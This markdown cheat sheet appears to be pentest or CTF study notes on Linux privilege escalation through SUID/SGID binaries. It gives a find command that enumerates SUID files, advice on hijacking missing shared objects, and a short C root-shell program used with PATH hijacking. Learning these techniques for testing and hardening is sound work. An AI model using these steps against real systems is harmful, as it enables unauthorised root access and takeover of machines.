# Privileges Escalation - Linux
# Exploiting SUID/SGID 

## Executables
- `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null` to look for executables, hoping some of them have an obsolete (so vulnerable) version.
- Search those versions on https://exploit-db.com or somewhere else, for example Github.
- If we find something interesting, copy the exploit and paste it on a `.sh` file, to make it runnable.
- Then run it to escalate privileges. Check if we became **root** with `whoami`.

## Shared objects
Some binaries could be vulnerable to shared objects injections.
- `strace <BINARY PATH> 2>&1 | grep -iE "open|access|no such file"` to look for missing dependencies.
- If we find a missing file from an accessible location (for example the `/home` directory), we could create it and place a root shell in it.

## Environment variable
Some binaries could have readable sequences of characters and they can be exploited, because they inherit the user's PATH environment variable and they attempt to execute programs without specifying an absolute path.
- `strings <BINARY PATH>` to look for readable ASCII or Unicode characters.
  - If we find some interesting stuffs like (for example) `system` and `service` without its full path (`/usr/sbin/service`), we can exploit it creating a `.c` program:
    ```
    int main() {
            setuid(0);  
            system("/bin/bash -p"); 
    }
    ```
    In which:
      - `setuid(0)` => root id.
      - `system` => command to exploit.
      - `/bin/bash -p` => privileged shell.
  - Let's compile it to make an executable file, called exactly as the command we are going to exploit: `gcc <EXPLOIT>.c -o service`
  - In the end, we have to tell the binary "I want you to look for `service` in my own path first, then in the others", so `PATH=.:$PATH <BINARY PATH>`:
    - `.` => our current directory.
    - `:$PATH` => join the original path.
  - Now, running the binary we should be able to gain access to a root. shell. Check it with `whoami`.










